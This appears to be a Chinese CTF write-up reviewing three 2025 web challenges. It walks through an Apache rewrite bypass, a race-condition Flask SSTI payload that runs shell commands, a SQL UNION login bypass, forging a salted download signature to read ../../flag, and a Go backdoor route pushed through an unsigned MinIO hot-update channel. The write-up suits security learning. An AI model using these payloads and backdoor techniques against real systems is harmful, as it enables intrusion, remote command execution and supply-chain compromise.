## 第一道：HGAME 2025 —— Level 38475 "角落"

### 为什么印象深刻

这道题是一条需要将多个分散线索串联起来才能完成利用的攻击链，从信息收集到漏洞利用层层递进，尤其是最后用**条件竞争（Race Condition）绕过WAF**的思路让我印象非常深刻，这是一种我之前几乎没有考虑过的WAF绕过角度。

### 题目结构与攻击过程

#### 第一步：信息收集 —— 读取 Apache 配置文件

通过 dirsearch 扫描发现 `robots.txt`，进而找到 `app.conf` 配置文件，揭示了如下关键信息：

```apache
RewriteEngine On
RewriteCond "%{HTTP_USER_AGENT}" "^L1nk/"
RewriteRule "^/admin/(.*)$" "/$1.html?secret=todo"

<Files "/usr/local/apache2/app/app.py">
    Order Allow,Deny
    Deny from all
</Files>

ProxyPass "/app/" "http://127.0.0.1:5000/"
```

**关键发现：**
- `app.py` 被 Apache 禁止直接访问
- 存在一条 URL 重写规则：当 `User-Agent` 以 `L1nk/` 开头时，`/admin/xxx` 会被重写为 `/xxx.html?secret=todo`

#### 第二步：绕过 Apache 访问控制，读取源码

利用 Apache URL 解码特性，将请求路径中的 `?` 编码为 `%3F`，构造如下请求：

```
GET /admin/usr/local/apache2/app/app.py%3F HTTP/1.1
User-Agent: L1nk/1.0
```

**利用原理：** Apache 在匹配 RewriteRule 时会将 `%3F` 解码为 `?`，触发重写规则，实际访问的路径变为 `/usr/local/apache2/app/app.py`，从而绕过了 `<Files>` 的限制，成功读取到 `app.py` 源码。

#### 第三步：分析源码，发现 SSTI 漏洞与 WAF

```python
@app.route('/read', methods=['GET'])
def read_message():
    if "{" not in readmsg():
        show = show_msg.replace("{{message}}", readmsg())
        return render_template_string(show)
    return 'waf!!'
```

漏洞分析：
- `/read` 路由读取 `message.txt` 的内容，并将其嵌入模板字符串后调用 `render_template_string()`，存在 **Flask SSTI（服务端模板注入）**。
- WAF 逻辑：先调用一次 `readmsg()` 检查是否包含 `{`，如果不含才继续处理；但在检查通过后，又**第二次调用 `readmsg()`** 读取文件内容。

**这里就是关键：两次 `readmsg()` 调用之间存在时间差！**

#### 第四步：条件竞争绕过 WAF，实现 SSTI RCE

利用线程池并发发送三个请求：

1. **POST /send**（正常内容 `message=123`）—— 写入合法内容，通过 WAF 检查
2. **POST /send**（SSTI payload）—— 在极短时间内覆盖文件内容
3. **GET /read** —— 触发模板渲染

```python
from concurrent.futures import ThreadPoolExecutor
import requests

def send_post(data):
    requests.post("http://.../app/send", data=data)

def send_get():
    requests.get("http://.../app/read")

with ThreadPoolExecutor(max_workers=3) as executor:
    executor.submit(send_post, "message=123")
    executor.submit(send_post, "message={{lipsum.__globals__.get('os').popen('cat /f*').read()}}")
    executor.submit(send_get)
```

**竞争窗口：** 在服务器第一次 `readmsg()`（检查阶段）读到 `123`（通过WAF），第二次 `readmsg()`（渲染阶段）读到 SSTI payload 的极短时间窗口内，多次尝试即可成功。

### 收获的利用思路

1. **Apache 配置文件分析能力**：学会从 Apache RewriteRule 和访问控制规则中发现绕过路径。
2. **URL 编码绕过文件访问限制**：`%3F` 编码绕过 `<Files>` 匹配，是一个很有启发性的 Trick。
3. **Flask SSTI 利用**：掌握了通过 `lipsum.__globals__` 等方式调用系统命令的 SSTI Payload。
4. **条件竞争绕过 WAF**：WAF 逻辑中两次文件读取之间的 TOCTOU（检查时与使用时不一致）漏洞，这种绕过思路可以推广到很多类似的场景（如文件上传检测后处理、二次渲染等）。

## 第二道：DASCTF 2025 下半年 —— "devweb"

### 为什么印象深刻

这道题的攻击面非常广，从前端打包代码分析到后端签名算法逆向，每一步都需要对安全有细致的理解。它完整展示了一个"开发者安全意识不足"所带来的多层安全问题，非常贴近真实渗透场景。

### 题目结构与攻击过程

#### 第一步：分析前端打包文件，提取敏感信息

抓包发现前端资源文件 `/assets/index-BgDOi0T5.js`（Vue.js 打包产物），使用 AI 辅助分析，发现两个致命问题：

**① 任意文件下载签名硬编码**

```javascript
downloadFile(t) {
    window.location.href = `/download?file=${t.name}&sign=6f742c2e79030435b7edc1d79b8678f6`
}
```

`6f742c2e79030435b7edc1d79b8678f6` 正是 `app.jmx` 的 MD5 值，推测服务端验证逻辑为 `check if sign == md5(filename)`。

**② 登录请求被硬编码到 localhost**

```javascript
dt.post("http://localhost:8080/login", ...)
```

开发者忘记将本地测试地址改为生产地址，导致浏览器尝试连接本机的 8080 端口，请求超时，且公钥被注释掉导致 RSA 加密失败。

#### 第二步：绕过登录 —— SQL 联合注入

通过修改请求直接向服务端发送 SQL 注入，绕过登录认证：

```
username=' UNION SELECT 1,2,3-- &password=123456
```

登录成功，获取 Session（JSESSIONID）。

#### 第三步：下载配置文件，破解签名算法

由于真实签名算法包含 salt，需要先下载 `app.jmx`（已知 MD5 值）获取盐值：

```python
params = {"file": "app.jmx", "sign": "6f742c2e79030435b7edc1d79b8678f6"}
```

在 `app.jmx` 中发现 Groovy 脚本，揭示了完整的签名算法：

```groovy
def firstMi = DigestUtils.md5Hex(mingWen);        // 文件名MD5
def jieStr = firstMi.substring(5, 16);            // 截取第5-16位
def newStr = firstMi + jieStr + salt;             // 拼接
def sign = DigestUtils.md5Hex(newStr);            // 最终签名
```

以及 salt 值：`f9bc855c9df15ba7602945fb939deefc`

#### 第四步：计算正确签名，下载 Flag

```python
import hashlib

def calculate_sign(filename):
    salt = "f9bc855c9df15ba7602945fb939deefc"
    first_mi = hashlib.md5(filename.encode('utf-8')).hexdigest()
    jie_str = first_mi[5:16]
    new_str = first_mi + jie_str + salt
    return hashlib.md5(new_str.encode('utf-8')).hexdigest()
```

flag 路径为 `../../flag`，生成签名后通过文件下载接口成功读取。

### 收获的利用思路

1. **前端代码安全分析**：现代前端框架打包后的 JS 文件（Webpack/Vite产物）中可能包含硬编码的 API key、签名密钥、内网地址等敏感信息，这是真实渗透中的高价值信息来源。
2. **SQL 联合注入绕过认证**：经典的 `UNION SELECT` 注入，思路清晰，效果直接。
3. **签名算法逆向**：从配置文件中读取服务端签名逻辑，用 Python 复现签名算法，这是一种"以子之矛攻子之盾"的利用思路，在任意文件读取/下载中很实用。
4. **攻击链的整体思维**：前端分析 → 登录绕过 → 获取配置 → 破解签名 → 任意文件读取，每一步的产出都是下一步的输入，完整的攻击链思维在实战渗透中非常重要。

## 第三道：HGAME 2025 —— Level 25 "双面人派对"

### 为什么印象深刻

这道题将**二进制逆向**、**云存储安全**和**供应链攻击**三个方向结合在一起，最终通过劫持应用的自动更新机制（Hot Reload）实现了 RCE，攻击路径非常新颖。这道题让我意识到，安全威胁不仅来自 Web 层，也可能来自底层基础设施和 DevOps 流程。

### 题目结构与攻击过程

#### 第一步：逆向分析二进制，提取凭证

Web 服务下载的 `main` 附件被加壳，使用工具手动脱掉 UPX 壳，用 IDA 打开后发现程序使用了 **MinIO**（开源对象存储服务）。

在程序中找到硬编码的凭证：

```yaml
endpoint: 127.0.0.1:9000
access_key: minio_admin
secret_key: JPSQ4N08vh2/W7hzdLyRYLDm0wNRWG48BL09yOKGplis=
bucket: prodbucket
key: update
```

#### 第二步：连接 MinIO，发现供应链更新机制

使用 `mc`（MinIO Client）连接并探索存储桶，在 `hints` 桶中下载到源码 `src.zip`。

分析 `main.go` 发现应用使用 **overseer** 库实现热更新：

```go
fetcher := &fetch.MinioFetcher{
    Bucket: conf.MinioBucket,
    Key:    conf.MinioKey,  // "update"
    // ...
}
overseer.Run(overseer.Config{
    Program: program,
    Fetcher: fetcher,
})
```

程序会定期从 MinIO 的 `prodbucket/update` 拉取新的可执行文件并自动重启。**关键漏洞：没有对下载的二进制文件进行签名验证。**

#### 第三步：编译恶意二进制，上传实现供应链攻击

在 `main.go` 中添加后门路由：

```go
g.GET("/cmd", func(c *gin.Context) {
    command := c.Query("command")
    cmd := exec.Command("sh", "-c", command)
    // 返回命令执行结果
})
```

交叉编译为 Linux 可执行文件，上传到 MinIO 存储桶中覆盖 `update` 文件：

```bash
GOOS=linux GOARCH=amd64 go build -o main main.go
mc cp main minio/prodbucket/update
```

等待 overseer 检测到文件更新并自动重启服务，后门路由生效，访问 `/cmd?command=cat /flag` 获取 flag。

### 收获的利用思路

1. **UPX 脱壳 + 逆向分析**：从二进制文件中提取硬编码凭证是真实渗透中常见的信息收集手段，很多开发者认为编译成二进制就"安全了"，实则不然。
2. **云存储安全（MinIO/OSS/S3）**：当获取到云存储凭证时，不只是能读取数据，如果有写权限还能进行更深入的利用。
3. **供应链攻击（CI/CD/热更新劫持）**：通过劫持应用的自动更新机制来植入后门，是一种高价值的持久化和权限提升手段，在真实的红队场景中非常有效，这类攻击面在传统安全测试中容易被忽视。
4. **跨语言能力的价值**：题目需要读懂 Go 代码逻辑、分析 MinIO API，再重新编译，要求选手有较强的工程能力，这也是安服工作中经常需要面对的场景。

## 总结

| 题目 | 核心漏洞 | 关键技巧 |
|------|---------|---------|
| HGAME 2025 角落 | Flask SSTI + WAF绕过 | Apache配置分析、条件竞争（Race Condition） |
| DASCTF 2025 devweb | 任意文件下载 + SQL注入 | 前端JS逆向分析、签名算法复现 |
| HGAME 2025 双面人派对 | 供应链攻击（热更新劫持） | 二进制逆向脱壳、MinIO云存储利用 |

这三道题给我最大的共同感受是：**安全问题往往不是单点的，而是由多个看似无害的"小问题"叠加形成的**。作为安全从业者，需要培养全局视角，将每一个信息泄露点、每一个逻辑缺陷串联起来，才能发现真正的攻击路径。
